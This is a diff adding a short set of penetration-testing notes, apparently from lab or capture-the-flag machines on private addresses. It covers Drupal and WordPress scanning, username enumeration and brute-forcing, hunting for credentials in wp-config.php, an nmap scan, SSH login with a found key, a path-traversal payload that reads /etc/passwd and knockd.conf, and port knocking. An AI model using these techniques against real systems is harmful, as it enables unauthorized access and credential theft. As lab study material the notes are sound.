@@ -1,0 +1,27 @@
+*If drupal is present use droopescan.
+>cd into droopescan>./droopescan scan drupal -u http://192.168.210.140:80/
+
+
+
+*Wpscan → Use the tool for the job.
+* Error-Message Username Enumeration is outright lethal. As attackers, it would “cut” 50% or more effor tto a successful login off the “tree”.
+*Wpscan also has an extremely effective Brute-Forcing capability
+*Wordpress? wp-config.php(cd /var/www/html)
+*VALID System-Level User? sudo -l
+*Password Reuse
+
+
+nmap -p- -sC -sV <IP> --open
+/etc/hosts add the ip and the host name for example "192.168.0.1 dc-2"
+
+
+
+*login to ssh using the authorized key. make sure file is  chmod 600 deployment_key.txt and then     
+ ssh -i deployment_key.txt tanto@192.168.1.118
+
+
+../../../../etc/passwd (view-source:http://192.168.153.137/home.php?showcase=../../../../etc/passwd)
+The ftp port is filtered so we check (../../../../etc/knockd.conf)
+[FTP]
+sequence = 1234:tcp,5678:tcp,9012:tcp
+unblock the port by knocking the ip with this sequence. the command is "knock 192.168.153.137 1234 5678 9012 -v
